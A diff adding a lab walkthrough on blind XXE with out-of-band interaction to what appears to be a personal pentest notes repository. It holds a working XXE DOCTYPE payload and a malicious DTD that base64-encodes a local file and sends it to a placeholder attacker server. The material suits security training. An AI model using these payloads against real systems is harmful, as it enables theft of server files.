@@ -31,4 +31,38 @@ If the last command was useful we can now try to report critical files using Wra
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/eac5fa56-da99-429f-9d50-4168c56bac44" width="800">
 
 
-### Wrappers.
+### Lab: Blind XXE with out-of-band interaction.
+The first thing we can do is to check if we can connect to our server.
+We can use the next line in the vulnerable xml.
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
+```
+![2](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/06cdbc88-48ab-4f97-a0d0-6ec76ce4a022)
+
+After checking if we get the connection we have to create the file `malicious.dtd`.
+```dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<fileToRead>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<AttackerServer>/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3" width="600">
+
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
+```
+
+![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3)
+
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/d08deeba-67c9-49e3-bdd4-a29dde33e9be" width="600">
+
+![5](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/d08deeba-67c9-49e3-bdd4-a29dde33e9be)
+
+
+![b642](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/01b1ee23-a7a5-4cd0-addf-f626f9e1a75b)
+
+
+
+
+
